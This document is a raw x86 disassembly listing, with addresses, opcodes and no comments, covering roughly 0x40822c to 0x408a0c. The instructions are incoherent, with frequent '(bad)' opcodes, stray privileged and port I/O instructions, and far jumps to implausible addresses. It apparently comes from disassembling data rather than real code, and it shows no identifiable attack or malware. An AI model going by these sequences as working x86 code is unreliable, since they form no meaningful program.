  40822c:	mov    cl,0xc8
  40822e:	jle    0x40829f
  408230:	clc    
  408231:	push   ecx
  408232:	inc    ebp
  408233:	mov    ebp,0xdcc02da7
  408238:	sub    al,0x23
  40823a:	hlt    
  40823b:	fs (bad) 
  40823d:	sub    DWORD PTR [edx],ecx
  40823f:	int    0x9f
  408241:	rcl    dl,0xc0
  408244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408245:	aaa    
  408246:	(bad)  
  408247:	stc    
  408248:	inc    edi
  408249:	mov    al,0x70
  40824b:	pushf  
  40824c:	or     bl,BYTE PTR [edi+0x1d]
  40824f:	pusha  
  408250:	inc    edx
  408251:	imul   ecx,DWORD PTR [edx+0x4f],0xffffffbc
  408255:	retf   0x268c
  408258:	xchg   esi,eax
  408259:	or     DWORD PTR [ebx+0x26d5c1f8],ecx
  40825f:	xor    esi,edi
  408261:	test   cl,ah
  408263:	push   ecx
  408264:	dec    edi
  408265:	sbb    al,0xfd
  408267:	push   eax
  408268:	imul   ecx,DWORD PTR [edi+edx*8],0xb7bc38da
  40826f:	fdivr  QWORD PTR [edx+0x67ea0071]
  408275:	dec    edx
  408276:	push   esp
  408277:	in     eax,dx
  408278:	xor    BYTE PTR [edi],al
  40827a:	mov    dl,0x61
  40827c:	dec    ecx
  40827d:	push   eax
  40827e:	xor    eax,0xa92d0f9a
  408283:	(bad)  
  408284:	pop    ebx
  408285:	cdq    
  408286:	scas   al,BYTE PTR es:[edi]
  408287:	mov    ch,0x5b
  408289:	xchg   esp,eax
  40828a:	and    al,0x2
  40828c:	arpl   WORD PTR [ecx-0x73],sp
  40828f:	icebp  
  408290:	jp     0x4082f2
  408292:	jg     0x408252
  408294:	mov    ch,0xa5
  408296:	or     al,BYTE PTR [esi+edx*8-0x3b]
  40829a:	push   ebp
  40829b:	sub    edx,edi
  40829d:	cmp    al,0x8c
  40829f:	cmp    dl,BYTE PTR [edi+eax*2]
  4082a2:	xor    DWORD PTR [eax+ebp*2],esi
  4082a5:	or     al,0xeb
  4082a7:	retf   
  4082a8:	fdecstp 
  4082aa:	and    ebp,DWORD PTR [esi-0x72cd12e]
  4082b0:	cwde   
  4082b1:	inc    esi
  4082b2:	dec    ebp
  4082b3:	(bad)  
  4082b4:	idiv   edi
  4082b6:	mov    ds:0x596063a1,eax
  4082bb:	mov    esp,0xbfd2d26e
  4082c0:	sub    BYTE PTR [edx+edi*2-0x666c57d6],bh
  4082c7:	push   ebx
  4082c8:	call   0x6bb0:0xd15bd4cc
  4082cf:	cmp    al,0xb5
  4082d1:	icebp  
  4082d2:	ffree  st(7)
  4082d4:	push   es
  4082d5:	(bad)  
  4082d6:	dec    esi
  4082d7:	xlat   BYTE PTR ds:[ebx]
  4082d8:	and    eax,0x428a9b1e
  4082dd:	stos   DWORD PTR es:[edi],eax
  4082de:	cmp    ah,BYTE PTR [eax-0x38c955f]
  4082e4:	repz in eax,0xfc
  4082e7:	or     BYTE PTR [edi+ebx*4+0x40c8afbf],ah
  4082ee:	sub    ebx,DWORD PTR [esi-0x55]
  4082f1:	jge    0x4082dc
  4082f3:	mov    dl,dl
  4082f5:	dec    ecx
  4082f6:	addr16 xchg edx,eax
  4082f8:	fst    QWORD PTR [edx]
  4082fa:	sbb    BYTE PTR [ebp+0x11a0b999],dl
  408300:	jb     0x408376
  408302:	jmp    0xa053a32c
  408307:	or     ah,bh
  408309:	icebp  
  40830a:	nop
  40830b:	ja     0x40830e
  40830d:	sbb    BYTE PTR [ebx-0x38],ch
  408310:	inc    edx
  408311:	mov    ah,0x1a
  408313:	or     al,0x1b
  408315:	sbb    DWORD PTR [ecx+edx*4+0x79],edx
  408319:	push   es
  40831a:	and    BYTE PTR [esi],al
  40831c:	lock xor DWORD PTR [ebx],ebp
  40831f:	out    0xac,al
  408321:	cs and esp,0xffffffb6
  408325:	inc    edx
  408326:	pushaw 
  408328:	mov    bl,0xaa
  40832a:	jo     0x4082fd
  40832c:	je     0x4082eb
  40832e:	push   bp
  408330:	pop    ecx
  408331:	mov    bl,0x24
  408333:	div    BYTE PTR [edi+eiz*8]
  408336:	push   cs
  408337:	adc    DWORD PTR [ecx],0x3b
  40833a:	or     BYTE PTR [edx-0x244c23da],ch
  408340:	call   0x34c1:0x40f98a1f
  408347:	pop    edi
  408348:	fstp   QWORD PTR [ebx+0x43]
  40834b:	xor    DWORD PTR [ecx],edi
  40834d:	out    0xef,al
  40834f:	sbb    eax,0x795bb065
  408354:	dec    ebx
  408355:	arpl   WORD PTR [ebx],bp
  408357:	sub    eax,0x620b1413
  40835c:	jge    0x4082e9
  40835e:	imul   edi,DWORD PTR [esi+0x31219ce8],0xf6fd8190
  408368:	scas   al,BYTE PTR es:[edi]
  408369:	inc    edi
  40836a:	mov    ebp,0xb66388b6
  40836f:	cmp    esp,DWORD PTR [eax]
  408371:	jge    0x408384
  408373:	or     al,0x81
  408375:	push   es
  408376:	in     al,0x2a
  408378:	xchg   edx,eax
  408379:	imul   edx,DWORD PTR [edx],0xffffffb2
  40837c:	call   0xb355875
  408381:	mov    ah,0x2
  408383:	stos   DWORD PTR es:[edi],eax
  408384:	(bad)  
  408385:	out    0xcd,al
  408387:	(bad)  
  408388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408389:	pop    edx
  40838a:	mov    BYTE PTR [esi+0x1ed0913e],bh
  408390:	add    ch,BYTE PTR [edx]
  408392:	std    
  408393:	inc    edx
  408394:	outs   dx,BYTE PTR ds:[esi]
  408395:	push   0xffffffb0
  408397:	xor    edx,DWORD PTR [eax-0x16454dd8]
  40839d:	jg     0x408330
  40839f:	jnp    0x408371
  4083a1:	mov    ah,0xc8
  4083a3:	gs jbe 0x408346
  4083a6:	dec    edi
  4083a7:	call   0x874847ea
  4083ac:	and    al,0x93
  4083ae:	cmp    al,0xfd
  4083b0:	aam    0x7f
  4083b2:	sub    al,0x53
  4083b4:	xchg   esp,eax
  4083b5:	(bad)  
  4083b7:	mov    WORD PTR [edx+0x5b],?
  4083ba:	cmp    eax,0xe86d6917
  4083bf:	leave  
  4083c0:	push   ebp
  4083c1:	push   ecx
  4083c2:	neg    BYTE PTR [edi+ebx*1-0x1c4b2147]
  4083c9:	and    BYTE PTR [edi-0x29],al
  4083cc:	daa    
  4083cd:	in     eax,dx
  4083ce:	fst    DWORD PTR [ebx-0x30]
  4083d1:	pop    bx
  4083d3:	jno    0x408383
  4083d5:	stos   BYTE PTR es:[edi],al
  4083d6:	pop    esp
  4083d7:	fldcw  WORD PTR ds:0x6dec543d
  4083dd:	push   edi
  4083de:	jecxz  0x408421
  4083e0:	leave  
  4083e1:	add    dh,bl
  4083e3:	jmp    0xbf2eaf68
  4083e8:	inc    edi
  4083e9:	push   edi
  4083ea:	push   es
  4083eb:	sahf   
  4083ec:	cmp    dh,dl
  4083ee:	jmp    0x6a9bbe6f
  4083f3:	pop    esi
  4083f4:	popa   
  4083f5:	(bad)  [ebx+0x3bd1efbe]
  4083fb:	(bad)  
  4083fc:	pop    ds
  4083fd:	jae    0x408441
  4083ff:	pop    ds
  408400:	or     eax,0xe76d40d3
  408405:	xchg   edx,eax
  408406:	vmovlpd xmm4,xmm4,QWORD PTR ds:[edx+0x61]
  40840c:	popf   
  40840d:	push   ss
  40840e:	xchg   ecx,eax
  40840f:	lds    eax,FWORD PTR [ebx+0x11848725]
  408415:	out    0x6b,al
  408417:	jne    0x40840c
  408419:	hlt    
  40841a:	popa   
  40841b:	jnp    0x4083be
  40841d:	fbld   TBYTE PTR [ecx-0x6a]
  408420:	clc    
  408421:	inc    edx
  408422:	in     eax,dx
  408423:	and    ebx,esp
  408425:	push   es
  408426:	pop    eax
  408427:	cmp    al,0xc5
  408429:	dec    edi
  40842a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40842b:	add    eax,0xc064ef3
  408430:	js     0x4083cf
  408432:	jg     0x408473
  408434:	jecxz  0x4083c0
  408436:	sbb    DWORD PTR [esi],esp
  408438:	in     al,0x7c
  40843a:	dec    eax
  40843b:	mov    esp,esi
  40843d:	pusha  
  40843e:	inc    ecx
  40843f:	push   esp
  408440:	adc    bh,ch
  408442:	sub    DWORD PTR [edx+edi*2+0x5b],ebp
  408446:	and    al,0x3e
  408448:	or     DWORD PTR [ebp+0x29],0xb4a7189c
  40844f:	pop    es
  408450:	sbb    al,0x74
  408452:	sbb    ch,dl
  408454:	push   es
  408455:	test   eax,0x1fe9f67a
  40845a:	xchg   DWORD PTR [eax-0x51],edi
  40845d:	ins    DWORD PTR es:[edi],dx
  40845e:	jge    0x4084b6
  408460:	inc    esp
  408461:	pop    es
  408462:	repnz add ah,BYTE PTR ds:0xa6ca4673
  408469:	lods   al,BYTE PTR ds:[esi]
  40846a:	(bad)  
  40846c:	in     al,0x8a
  40846e:	sbb    ebx,DWORD PTR [esi-0x5b24a43]
  408474:	aam    0xf5
  408476:	push   ebx
  408477:	mov    esi,0x750a83cb
  40847c:	dec    esi
  40847d:	outs   dx,DWORD PTR ds:[esi]
  40847e:	stos   DWORD PTR es:[edi],eax
  40847f:	aad    0xbc
  408481:	ins    BYTE PTR es:[edi],dx
  408482:	jo     0x40845f
  408484:	aam    0x2c
  408486:	and    eax,DWORD PTR [ecx+0x57b1f8a6]
  40848c:	ret    
  40848d:	xchg   edi,eax
  40848e:	xchg   DWORD PTR [eax+0x1a70860b],ecx
  408494:	rol    ch,cl
  408496:	ins    DWORD PTR es:[edi],dx
  408497:	lods   eax,DWORD PTR ds:[esi]
  408498:	rol    DWORD PTR [edx+0x78495e21],0x94
  40849f:	push   cs
  4084a0:	in     eax,0xe2
  4084a2:	in     eax,0x9e
  4084a4:	sub    dh,BYTE PTR ds:0xd6e55a33
  4084aa:	test   DWORD PTR [edx+edi*1+0x43357d6e],0x2a43bfc5
  4084b5:	jns    0x408469
  4084b7:	outs   dx,BYTE PTR ds:[esi]
  4084b8:	mov    ebx,0x4074cd01
  4084bd:	pushf  
  4084be:	in     al,0xa4
  4084c0:	push   edi
  4084c1:	shl    edx,cl
  4084c3:	sbb    DWORD PTR [eax+0x3],esi
  4084c6:	imul   esp,DWORD PTR [eax+edi*1+0x58],0x3cb1f5c
  4084ce:	mov    DWORD PTR [edx+0x1],0x4bb229d8
  4084d5:	leave  
  4084d6:	ins    DWORD PTR es:[edi],dx
  4084d7:	lods   al,BYTE PTR ds:[esi]
  4084d8:	fcomp  DWORD PTR [esi-0x48]
  4084db:	cmp    BYTE PTR [ebx-0x793b599b],dl
  4084e1:	add    ah,bl
  4084e3:	shr    DWORD PTR [edi-0x51547eb5],1
  4084e9:	in     eax,0x5
  4084eb:	int3   
  4084ec:	ins    BYTE PTR es:[edi],dx
  4084ed:	mov    al,ds:0x6c715d85
  4084f2:	aas    
  4084f3:	inc    edx
  4084f4:	jle    0x4084f8
  4084f6:	and    DWORD PTR [ebx-0xe],eax
  4084f9:	daa    
  4084fa:	push   esp
  4084fb:	mov    cl,bl
  4084fd:	inc    esp
  4084fe:	pop    edi
  4084ff:	outs   dx,DWORD PTR ds:[esi]
  408500:	fidiv  WORD PTR ds:0x84716fb2
  408506:	ror    BYTE PTR [ebp-0x7c],1
  408509:	push   0x71
  40850b:	xor    BYTE PTR [esi+0x2af548f5],dh
  408511:	xor    DWORD PTR [ebp+eiz*1-0x33bd416],0x13a72f37
  40851c:	fmul   QWORD PTR [ecx]
  40851e:	fcomp  QWORD PTR gs:[ebp+0x51b03538]
  408525:	cmp    ebx,ebx
  408527:	jp     0x408506
  408529:	out    dx,al
  40852a:	pop    es
  40852b:	jmp    0x6836:0x4683c90
  408532:	int3   
  408533:	mov    edx,0xc0c429f3
  408538:	or     BYTE PTR [ecx+0x8],dl
  40853b:	xor    DWORD PTR [esi+ebx*8],0x7dac58b7
  408542:	mov    bh,0x2e
  408544:	inc    edx
  408545:	scas   al,BYTE PTR es:[edi]
  408546:	push   edi
  408547:	sbb    DWORD PTR ds:0x1aa1d6b5,ebp
  40854d:	fild   DWORD PTR [ebx-0x5e]
  408550:	das    
  408551:	xchg   DWORD PTR [ecx],ebp
  408553:	pop    ecx
  408554:	loop   0x408524
  408556:	mov    ss,WORD PTR [ebx+0x4748d21d]
  40855c:	ret    0xb513
  40855f:	pop    esp
  408560:	sti    
  408561:	out    dx,eax
  408562:	cmp    ch,BYTE PTR [ecx]
  408564:	in     al,0x2a
  408566:	mov    ebx,0x876f5e9c
  40856b:	jmp    0x408561
  40856d:	lahf   
  40856e:	repz sbb DWORD PTR es:[ebp-0x1159b675],0xffffff98
  408577:	les    edi,FWORD PTR [ecx]
  408579:	retf   0x8c1f
  40857c:	push   edx
  40857d:	test   eax,0x36b834c0
  408582:	xchg   ebx,eax
  408583:	jnp    0x408531
  408585:	mov    al,0xcd
  408587:	add    dl,BYTE PTR fs:[eax+0x21]
  40858b:	lods   al,BYTE PTR ds:[esi]
  40858c:	repnz stos DWORD PTR es:[edi],eax
  40858e:	cmp    eax,0xcafc1469
  408593:	mov    al,ds:0x439de470
  408598:	push   0xd234b153
  40859d:	and    BYTE PTR [ebx+ecx*4],0x9e
  4085a1:	push   0xffffffaf
  4085a3:	and    edx,DWORD PTR [edi]
  4085a5:	push   ebx
  4085a6:	mov    bh,0xd5
  4085a8:	mov    WORD PTR [esi],?
  4085aa:	call   0xdef43c9e
  4085af:	and    esi,esi
  4085b1:	je     0x408614
  4085b3:	imul   BYTE PTR [edi]
  4085b5:	nop
  4085b6:	xchg   esi,eax
  4085b7:	jno    0x40857f
  4085b9:	push   esi
  4085ba:	mov    eax,0x9e0d4324
  4085bf:	sub    bh,dl
  4085c1:	xor    DWORD PTR [ebx-0x4d],0x30bf273d
  4085c8:	dec    edx
  4085c9:	imul   esp,DWORD PTR [ebx-0x21],0x78
  4085cd:	pusha  
  4085ce:	lods   eax,DWORD PTR ds:[esi]
  4085cf:	inc    edx
  4085d0:	push   ebx
  4085d1:	push   ebp
  4085d2:	aam    0x37
  4085d4:	xchg   edx,eax
  4085d5:	mov    bl,0xb4
  4085d7:	pushf  
  4085d8:	and    BYTE PTR [ecx],dh
  4085da:	retf   
  4085db:	xchg   ebp,eax
  4085dc:	push   0xfffffff2
  4085de:	adc    al,0xe8
  4085e0:	int3   
  4085e1:	(bad)  
  4085e2:	jo     0x4085ca
  4085e4:	(bad)  
  4085e5:	mov    al,0x6a
  4085e7:	inc    edi
  4085e8:	jle    0x40858e
  4085ea:	jae    0x4085ca
  4085ec:	fstp   QWORD PTR [esp+ebp*2+0x65]
  4085f0:	push   edi
  4085f1:	(bad)  
  4085f2:	nop
  4085f3:	push   ds
  4085f4:	les    esi,FWORD PTR [ebx]
  4085f6:	cmp    BYTE PTR [esi],dh
  4085f8:	fst    QWORD PTR [edi+0x6d]
  4085fb:	or     DWORD PTR [esi+0x733600d8],ebx
  408601:	jmp    0xa8ebca8b
  408606:	xchg   esi,eax
  408607:	mov    dl,0x27
  408609:	out    dx,al
  40860a:	xor    esp,DWORD PTR [esi+eiz*4-0x5a]
  40860e:	arpl   WORD PTR [ebx],bp
  408610:	and    ch,BYTE PTR [esi-0x70]
  408613:	cmp    al,0x33
  408615:	ds sahf 
  408617:	pusha  
  408618:	mov    fs,WORD PTR [esi-0x2b668805]
  40861e:	pminub mm0,QWORD PTR [esi]
  408621:	mov    bh,0x57
  408623:	pop    es
  408624:	int3   
  408625:	xor    ebx,DWORD PTR ds:[esi+0x15]
  408629:	inc    edi
  40862a:	retf   0x1d36
  40862d:	dec    esi
  40862e:	gs push ebx
  408630:	out    0x58,eax
  408632:	add    esp,esp
  408634:	xor    al,0x9b
  408636:	mov    edx,0x57a036b6
  40863b:	pop    ebp
  40863c:	xchg   ebx,eax
  40863d:	mov    eax,0xad0b75d9
  408642:	adc    eax,0x8d6f4988
  408647:	xchg   ecx,eax
  408648:	xor    ebp,DWORD PTR [eax+eax*4+0x76faab8a]
  40864f:	ret    0x85db
  408652:	xor    ebp,edi
  408654:	scas   eax,DWORD PTR es:[edi]
  408655:	sbb    BYTE PTR [edi-0x30],0xe0
  408659:	sbb    bh,bl
  40865b:	xor    eax,0x247abeee
  408660:	sub    DWORD PTR [edx],0x1d
  408663:	adc    ecx,DWORD PTR [ebx+0x4e]
  408666:	sub    esp,DWORD PTR [ebp+0x2e0b393b]
  40866c:	mov    edi,0xd2111997
  408671:	imul   edi,DWORD PTR [edi+0x2c2683dd],0x6e26a190
  40867b:	jnp    0x4086f8
  40867d:	xlat   BYTE PTR ds:[ebx]
  40867e:	jmp    0x40864e
  408680:	out    dx,eax
  408681:	xor    ah,dh
  408683:	xchg   ecx,eax
  408684:	cmp    dh,BYTE PTR [eax-0x50ec0bf3]
  40868a:	dec    ebp
  40868b:	jp     0x40864c
  40868d:	xchg   ebx,eax
  40868e:	shl    DWORD PTR [ebp+0x701e50de],1
  408694:	addr16 mov ds:0xd9c2,eax
  408698:	pop    ds
  408699:	pop    ebp
  40869a:	mov    WORD PTR [ecx+0x30],?
  40869d:	add    al,0x5d
  40869f:	push   0x74
  4086a1:	dec    edx
  4086a2:	mov    cl,0xdc
  4086a4:	xor    eax,0xa93ecda4
  4086a9:	and    DWORD PTR [edi-0x41],0x13
  4086ad:	rol    BYTE PTR [edx],1
  4086af:	adc    al,0x8
  4086b1:	(bad)  
  4086b2:	push   ss
  4086b3:	fs loopne 0x408640
  4086b6:	xor    eax,0x7f99ceea
  4086bb:	enter  0x7fae,0x50
  4086bf:	pop    ss
  4086c0:	out    0x7b,eax
  4086c2:	arpl   WORD PTR [edx+esi*2],bx
  4086c5:	scas   al,BYTE PTR es:[edi]
  4086c6:	mov    ebp,0x5d64e07c
  4086cb:	pop    edx
  4086cc:	clc    
  4086cd:	sahf   
  4086ce:	cmp    al,BYTE PTR [ebx-0x591cda35]
  4086d4:	or     BYTE PTR [ebx-0x3c415784],0xdd
  4086db:	sbb    al,0x9f
  4086dd:	in     al,0xa2
  4086df:	repz or al,0x7e
  4086e2:	mov    al,ds:0x483c3440
  4086e7:	lahf   
  4086e8:	daa    
  4086e9:	les    esp,FWORD PTR [edi]
  4086eb:	jmp    0xefe9:0xd482a32d
  4086f2:	ss fwait
  4086f4:	pop    ss
  4086f5:	jp     0x40875e
  4086f7:	and    eax,esp
  4086f9:	fadd   st(6),st
  4086fb:	adc    ebx,DWORD PTR [ecx-0x6c]
  4086fe:	push   cs
  4086ff:	or     ah,BYTE PTR [edx+0x7e]
  408702:	int    0x26
  408704:	ins    DWORD PTR es:[edi],dx
  408705:	xor    eax,0x5deda6e9
  40870a:	popf   
  40870b:	sub    eax,ebx
  40870d:	shl    BYTE PTR [ecx],cl
  40870f:	jns    0x408692
  408711:	mov    ch,0x79
  408713:	and    BYTE PTR [ebx-0x4b],dh
  408716:	fidivr DWORD PTR [eax+edi*4+0x18]
  40871a:	scas   al,BYTE PTR es:[edi]
  40871b:	and    eax,DWORD PTR [eax+0x44]
  40871e:	mov    ebp,0x8f55e223
  408723:	inc    edx
  408724:	xchg   ecx,eax
  408725:	jmp    0xf31c:0x8653b511
  40872c:	cmp    DWORD PTR [edx+0x6ea3f9dc],ebp
  408732:	mov    ebx,DWORD PTR [ebp+0x59]
  408735:	retf   
  408736:	ret    
  408737:	clc    
  408738:	mov    al,0x4a
  40873a:	xor    DWORD PTR [ebx+0x29ee52a6],ecx
  408740:	sbb    bh,bh
  408742:	adc    DWORD PTR [ebp-0x24161493],eax
  408748:	inc    edx
  408749:	lea    esi,[esi+0x1]
  40874c:	fdivr  DWORD PTR [edi]
  40874e:	int    0x20
  408750:	ret    0x4e6c
  408753:	add    eax,0xc1a69958
  408758:	pop    esp
  40875a:	jg     0x408734
  40875c:	inc    ebx
  40875d:	dec    ebx
  40875e:	mov    eax,ds:0xdb508608
  408763:	ret    
  408764:	push   0xddc02d6a
  408769:	fcomi  st,st(7)
  40876b:	adc    al,0x3a
  40876d:	mov    es,WORD PTR [eax+0x44]
  408770:	js     0x40876c
  408772:	mov    DWORD PTR [esi-0x1f20070],edx
  408778:	fsub   DWORD PTR [ebx-0x9cd7569]
  40877e:	shl    bl,1
  408780:	gs sub al,0x15
  408783:	xor    BYTE PTR [esp+esi*2],al
  408786:	fstp   DWORD PTR ds:0xe5f91103
  40878c:	cmp    esp,esp
  40878e:	inc    esp
  40878f:	cmp    bl,cl
  408791:	mov    ds:0xae98adf7,eax
  408796:	inc    ebp
  408797:	imul   esp,DWORD PTR [ebx-0x65],0x24ebd0d1
  40879e:	(bad)  
  40879f:	or     DWORD PTR [eax],edx
  4087a1:	daa    
  4087a2:	pop    ebp
  4087a3:	ret    
  4087a4:	ds xchg ebx,eax
  4087a6:	test   BYTE PTR [esi],ch
  4087a8:	sbb    DWORD PTR [ebx-0x74a3aba0],edx
  4087ae:	push   ebx
  4087af:	loopne 0x408820
  4087b1:	imul   ebx,eax,0xfffffff1
  4087b4:	adc    edx,esi
  4087b6:	int3   
  4087b7:	xor    cl,dl
  4087b9:	(bad)  
  4087bb:	ret    
  4087bc:	pop    ds
  4087bd:	fidiv  WORD PTR [edx+0x51]
  4087c0:	sahf   
  4087c1:	int3   
  4087c2:	leave  
  4087c3:	nop
  4087c4:	pop    eax
  4087c5:	sub    al,0x79
  4087c7:	sbb    DWORD PTR [ebx-0x670c68e4],esp
  4087cd:	mov    ?,ebp
  4087cf:	mov    edi,0x17cbf8fb
  4087d4:	add    dh,bh
  4087d6:	jne    0x4087a9
  4087d8:	xor    BYTE PTR [eax+0x4051c22a],0xb7
  4087df:	pop    ebp
  4087e0:	pop    ss
  4087e1:	mov    ds:0xcf5ac0a1,al
  4087e6:	jno    0x40876b
  4087e8:	test   al,0xea
  4087ea:	inc    esp
  4087eb:	xchg   esi,eax
  4087ec:	pop    eax
  4087ed:	fwait
  4087ee:	inc    esp
  4087ef:	imul   ebp,DWORD PTR [ecx],0xa5dde688
  4087f5:	jb     0x4087c5
  4087f7:	ins    BYTE PTR es:[edi],dx
  4087f8:	lds    ebx,FWORD PTR [edi-0x6d630167]
  4087fe:	repnz shl cl,1
  408801:	mov    dl,0x13
  408803:	push   0xffffffc7
  408805:	pushf  
  408806:	imul   ebx,DWORD PTR [ecx],0x45
  408809:	dec    eax
  40880a:	or     BYTE PTR [ecx+0x78],ah
  40880d:	mov    eax,ds:0x51546e2b
  408812:	gs js  0x4087f1
  408815:	jae    0x40883d
  408817:	mov    ah,0x19
  408819:	les    esp,FWORD PTR [ebx+0x24]
  40881c:	jge    0x40887c
  40881e:	cld    
  40881f:	jmp    0xdcca363f
  408824:	js     0x4087c1
  408826:	add    bh,dl
  408828:	sub    BYTE PTR ds:0xc6471e2f,bh
  40882e:	clc    
  40882f:	cmc    
  408830:	push   ebp
  408831:	xchg   ecx,eax
  408832:	fsub   DWORD PTR [ecx+0x10]
  408835:	pop    ecx
  408836:	stc    
  408837:	cld    
  408838:	push   eax
  408839:	push   eax
  40883a:	inc    esp
  40883b:	adc    ebp,DWORD PTR [edx]
  40883d:	mov    bh,0x27
  40883f:	jns    0x4087e3
  408841:	sub    DWORD PTR [ecx-0x27cce553],ecx
  408847:	mul    BYTE PTR [ebp+0xd17ec36]
  40884d:	fisubr WORD PTR [esi+0x585f1add]
  408853:	repnz in eax,dx
  408855:	sti    
  408856:	lods   al,BYTE PTR ds:[esi]
  408857:	push   ds
  408858:	shr    DWORD PTR [ecx+0x67e8e494],1
  40885e:	pop    eax
  40885f:	and    ebp,DWORD PTR [ebx-0x65e54bfd]
  408865:	out    dx,al
  408866:	mov    cl,0x4
  408868:	and    al,0x69
  40886a:	dec    ebp
  40886b:	jbe    0x408809
  40886d:	fs dec ecx
  40886f:	cs jae 0x4087fb
  408872:	clc    
  408873:	stos   BYTE PTR es:[edi],al
  408874:	je     0x40887d
  408876:	cmp    bh,BYTE PTR [ebp+ebp*4-0x27]
  40887a:	lds    ebp,FWORD PTR [edi+ebp*8]
  40887d:	ret    0x237a
  408880:	pop    eax
  408881:	ret    
  408882:	pop    ss
  408883:	cmp    edx,esi
  408885:	retf   
  408886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408887:	out    dx,eax
  408888:	fmul   QWORD PTR [esi-0x73c3fb45]
  40888e:	push   edi
  40888f:	aas    
  408890:	xchg   BYTE PTR [esi-0x4a6b2b97],bl
  408896:	xchg   BYTE PTR [edi],dh
  408898:	mov    al,ds:0xce160fc6
  40889d:	adc    al,0x97
  40889f:	cmp    eax,0xc167561c
  4088a4:	cmc    
  4088a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088a6:	sub    ah,BYTE PTR [ecx+0x1bc5cdb1]
  4088ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088ad:	(bad)  
  4088ae:	retf   0x30ec
  4088b1:	rcl    BYTE PTR [eax-0x1b],cl
  4088b4:	dec    esi
  4088b5:	mov    eax,ds:0xebc39fe3
  4088ba:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4088bc:	and    dh,dl
  4088be:	adc    BYTE PTR [ecx+0x55ed1807],cl
  4088c4:	cwde   
  4088c5:	cld    
  4088c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088c7:	sti    
  4088c8:	adc    al,0x87
  4088ca:	pusha  
  4088cb:	js     0x408858
  4088cd:	pop    esp
  4088ce:	xchg   esi,eax
  4088cf:	shl    DWORD PTR [edi+0x7d],1
  4088d2:	push   cs
  4088d3:	mov    cl,0x80
  4088d5:	inc    edx
  4088d6:	jb     0x408928
  4088d8:	xchg   ebp,eax
  4088d9:	call   0xfad4:0x951e8c54
  4088e0:	ja     0x408951
  4088e2:	out    0x64,eax
  4088e4:	mov    WORD PTR [ebx+0x70fba096],?
  4088ea:	sub    DWORD PTR [edi],eax
  4088ec:	add    ebx,DWORD PTR [ebx]
  4088ee:	inc    eax
  4088ef:	push   esp
  4088f0:	call   0xbf11f478
  4088f5:	mov    WORD PTR [ecx+0x3dcf585e],es
  4088fb:	sbb    eax,0xa0a5e3b7
  408900:	pop    edi
  408901:	(bad)  
  408902:	aam    0xf2
  408904:	ins    BYTE PTR es:[edi],dx
  408905:	mov    edi,0x1fe3ea33
  40890a:	xchg   esi,eax
  40890b:	xchg   edx,eax
  40890c:	inc    ebx
  40890d:	add    ecx,DWORD PTR [esi-0x34]
  408910:	adc    eax,0xde0e9526
  408915:	retf   0x6447
  408918:	mov    edi,0xcf62a659
  40891d:	icebp  
  40891e:	in     al,0x51
  408920:	mov    edx,0x239163ad
  408925:	and    DWORD PTR [ebp+0x65268f7a],edi
  40892b:	jecxz  0x4088f1
  40892d:	pop    edx
  40892e:	fwait
  40892f:	push   edx
  408930:	ins    DWORD PTR es:[edi],dx
  408931:	mov    edx,0x66d0e14a
  408936:	xor    eax,DWORD PTR [ebp+ecx*1+0x6b9ae495]
  40893d:	stos   BYTE PTR es:[edi],al
  40893e:	jb     0x40897b
  408940:	xchg   ah,dh
  408942:	adc    dh,al
  408944:	call   0xe4b5:0x40a19057
  40894b:	pop    ebx
  40894c:	jae    0x408904
  40894e:	adc    al,0xc2
  408950:	pop    eax
  408951:	icebp  
  408952:	jecxz  0x40891e
  408954:	js     0x4088f8
  408956:	arpl   WORD PTR [edi+0x1f677514],ax
  40895c:	addr16 cmp al,0xba
  40895f:	pop    ecx
  408960:	pop    edx
  408961:	mov    eax,ds:0xd9a435e6
  408966:	jo     0x40896f
  408968:	adc    BYTE PTR [edx],ah
  40896a:	sbb    BYTE PTR [edx+esi*4+0x5d116f5e],bl
  408971:	into   
  408972:	cld    
  408973:	mov    WORD PTR [esi+0x2b],fs
  408976:	inc    esi
  408977:	cmp    al,0xd1
  408979:	pop    ebx
  40897a:	push   eax
  40897b:	sbb    al,0xd8
  40897d:	add    esp,DWORD PTR [eax-0x7ed7f4bf]
  408983:	leave  
  408984:	stc    
  408985:	mov    dl,0xfb
  408987:	sbb    bh,0x67
  40898a:	jns    0x408965
  40898c:	dec    esi
  40898d:	shr    BYTE PTR [eax+0x858a78a],cl
  408993:	lock sbb DWORD PTR ds:0xe7229548,0xffffff87
  40899b:	add    DWORD PTR [ecx-0x554a719b],0xffffffb0
  4089a2:	push   0x58
  4089a4:	and    bl,BYTE PTR [edi]
  4089a6:	xchg   BYTE PTR [ecx+0x15858f23],cl
  4089ac:	lods   eax,DWORD PTR ds:[esi]
  4089ad:	jge    0x4089e3
  4089af:	ret    
  4089b0:	mov    ebp,0x98662911
  4089b5:	jg     0x40895d
  4089b7:	xor    DWORD PTR [ecx],esi
  4089b9:	xchg   edi,eax
  4089ba:	push   ds
  4089bb:	sub    DWORD PTR [ecx],esp
  4089bd:	mov    DWORD PTR [edi-0x43907d29],esi
  4089c3:	clc    
  4089c4:	xchg   edx,eax
  4089c5:	mov    cl,0x39
  4089c7:	repz mov esp,0x567674ff
  4089cd:	fst    QWORD PTR [ebp+esi*4-0xfe158c2]
  4089d4:	ss cdq 
  4089d6:	pop    ebx
  4089d7:	and    al,0x66
  4089d9:	cmp    BYTE PTR [eax-0x37f8bdb8],0x2b
  4089e0:	rcr    BYTE PTR [ecx+ecx*1+0x5f],0x14
  4089e5:	xchg   edx,eax
  4089e6:	mov    ds:0x4f1e36c0,al
  4089eb:	retf   
  4089ec:	cs popa 
  4089ee:	test   BYTE PTR [ebp+0x76],0x12
  4089f2:	pusha  
  4089f3:	mov    ebx,0x78cbfb1a
  4089f8:	dec    eax
  4089f9:	pop    esp
  4089fa:	xchg   BYTE PTR [ecx],ch
  4089fc:	ja     0x4089cb
  4089fe:	add    eax,0xb5e0d5d4
  408a03:	inc    eax
  408a04:	sub    DWORD PTR [ecx+0x2],esp
  408a07:	mov    cl,0xe2
  408a09:	sbb    ecx,DWORD PTR [edi+0x2e]
  408a0c:	pop    edx
